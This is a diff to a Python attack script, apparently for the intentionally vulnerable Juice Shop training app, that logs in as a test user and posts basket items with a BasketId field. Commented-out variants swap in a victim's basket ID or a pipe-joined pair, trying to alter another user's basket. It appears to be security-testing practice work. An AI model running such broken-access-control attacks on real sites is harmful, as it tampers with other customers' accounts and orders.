@@ -34,10 +34,10 @@ class manipulate_basket(a.attack_inter):
         self.juice_session = a.requests.session()
         #usr = usrLogin.test_user_login_class()
         #res, self.cookie, self.header = usr.first_login()
-        self.email = 'test257@gmail.com'
+        self.email = 'test66@gmail.com'
         self.cookie, self.header = a.auth_load(self.email)
         self.basketId = a.bid_load(self.email)
-        self.victimEmail = 'test257@gmail.com'
+        self.victimEmail = 'test334@gmail.com'
         self.victimBid = a.bid_load(self.victimEmail)
 
     def view_basket(self, basektId):
@@ -47,7 +47,7 @@ class manipulate_basket(a.attack_inter):
             productIds = []
             url = a.URL + '/rest/basket/' + str(basektId)
             response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
-            print(response.text)
+            # print(response.text)
             products = response.json()["data"]["Products"]
             for i in range( len(products) ):
                 item = products[i]
@@ -76,13 +76,24 @@ class manipulate_basket(a.attack_inter):
         try:
             productId = self.generate_productID(self.basketId)
             print("we will add product Id {} ".format(productId))
-            data = [('contract','lalala'),('contract','lololo')]
-            data_byte = parse.urlencode(data).encode("utf-8")
-            print(data_byte)
+            # data = [('contract','lalala'),('contract','lololo')]
+            # data_byte = parse.urlencode(data).encode("utf-8")
+            # print(data_byte)
+            json = {
+                "ProductId": 1,
+                #"BasketId": '|'.join([self.basketId, self.victimBid]),
+                "BasketId": self.basketId,
+                # "BasketId": self.victimBid,
+                "quantity": 1
+            }
+            # data = {
+            #     "BasketId": self.victimBid
+            # }
+
             url =a.URL + '/api/BasketItems/'
-            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header,data = data
-                                               , verify= False)
-            print(response.text)
+            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header,json = json, verify= False)
+
+            print(response.status_code)
             #self.view_basket(self.victimBid)
         except:
             print("2")
